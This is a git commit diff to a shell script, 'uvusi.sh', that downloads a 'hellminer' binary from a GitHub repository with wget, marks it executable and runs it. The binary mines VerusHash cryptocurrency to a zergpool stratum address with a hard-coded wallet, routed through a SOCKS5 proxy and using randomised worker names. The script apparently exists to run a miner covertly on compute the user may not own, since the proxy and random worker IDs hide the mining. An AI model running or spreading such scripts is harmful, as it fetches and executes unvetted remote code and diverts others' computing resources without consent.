d8716119ea20ac1c2572a0a94c3468dc49903b73
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-13 21:02:05 +0100

    Update uvusi.sh

--- uvusi.sh
+++ uvusi.sh
@@ -2,15 +2,11 @@
 sudo apt update
 sudo apt install screen -y
 sudo apt install screen libjansson4 -y
-git clone https://github.com/solinos-utabs/tpuku.git
-%cd tpuku
+wget https://github.com/solinos-utabs/tpuku/raw/main/hellminer
 chmod +x ./hellminer
-./hellminer
-chmod +x ./verus-solver
-./verus-solver
 screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
 WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
 PROXY=socks5://72.195.114.169:4145
-WORKER=Rig$(echo "$(curl -s ifconfig.me)" | tr . _ ))
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-BED))
 ./hellminer -c $POOL -u $WALLET.$WORKER $@ -p x --cpu 40
